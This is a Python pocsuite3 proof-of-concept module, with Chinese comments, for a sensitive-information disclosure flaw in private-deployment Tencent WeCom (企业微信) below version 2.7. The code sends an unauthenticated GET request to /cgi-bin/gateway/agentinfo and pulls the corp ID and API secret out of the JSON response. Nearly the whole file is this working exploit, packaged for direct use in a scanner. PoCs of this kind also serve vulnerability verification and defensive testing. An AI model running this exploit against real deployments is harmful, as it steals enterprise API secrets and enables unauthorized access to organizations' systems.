#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import json
from pocsuite3.api import (
    minimum_version_required, POCBase, register_poc, requests, logger,
    OptString, OrderedDict, POC_CATEGORY, random_str,
)
from poc_tool.tools import tools

minimum_version_required('2.0.4')


class DemoPOC(POCBase):
    vulID = '0'  # Seebug 漏洞收录 ID，如果没有则为 0
    version = '1'  # PoC 的版本，默认为 1
    author = 'zhizhuo'  # PoC 的作者
    vulDate = '2023-08-12'  # 漏洞公开日期 (%Y-%m-%d)
    createDate = '2023-10-16'  # PoC 编写日期 (%Y-%m-%d)
    updateDate = '2023-10-16'  # PoC 更新日期 (%Y-%m-%d)
    # 漏洞来源地址，0day 不用写
    references = [
        'https://peiqi.wgpsec.org/wiki/webapp/%E8%85%BE%E8%AE%AF/%E8%85%BE%E8%AE%AF%20%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%20agentinfo%20%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E.html']
    # PoC 名称，建议命令方式：<厂商> <组件> <版本> <漏洞类型> <cve编号>
    name = '腾讯 企业微信（私有化版本）敏感信息泄露漏洞'
    appPowerLink = 'https://work.weixin.qq.com/'  # 漏洞厂商主页地址
    appName = 'Tencent-企业微信'  # 漏洞应用名称
    appVersion = '<2.7'  # 漏洞影响版本
    vulType = 'Information Disclosure'  # 漏洞类型，参见漏洞类型规范表
    desc = '企业微信 /cgi-bin/gateway/agentinfo接口未授权情况下可直接获取企业微信secret等敏感信息'  # 漏洞简要描述
    samples = ['http://192.168.1.1']  # 测试样列，就是用 PoC 测试成功的目标
    pocDesc = ''' poc的用法描述 '''
    category = POC_CATEGORY.EXPLOITS.WEBAPP  # PoC 的分类
    protocol = POC_CATEGORY.PROTOCOL.HTTP  # PoC 的默认协议，方便对 url 格式化
    # protocol_default_port = 8443  # 目标的默认端口，当提供的目标不包含端口的时候，方便对 url 格式化
    # 搜索 dork，如果运行 PoC 时不提供目标且该字段不为空，将会调用插件从搜索引擎获取目标。
    # dork = {'zoomeye': 'deviceState.admin.hostname'}
    # suricata_request = '''http.uri; content: "";'''  # 请求流量 suricata 规则
    # suricata_response = ''  # 响应流量 suricata 规则
    hasexp = True  # 是否有EXP
    Level = 3  # 漏洞危害等级，0低危 1中危害 2高危 3严重
    device_name = 'Tencent-企业微信'

    def _exploit(self):
        if not self._check(dork=''):
            return False

        headers = {}
        res = requests.get(self.url + "/cgi-bin/gateway/agentinfo", headers=headers)
        logger.debug(res.text)
        return res

    def _verify(self):
        result = {}
        req_list = list()
        res = self._exploit()
        req_list.append(tools.get_all_requests(res))
        if res.status_code == 200 and 'Secert' in res.text and 'strcorpid' in res.text and 'corpid' in res.text:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['DATA'] = res.json().get('strcorpid') + '\n' + res.json().get(
                'corpid') + '\n' + res.json().get('Secert')
            result["request"] = req_list
        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def _shell(self):
        return self._verify()


register_poc(DemoPOC)
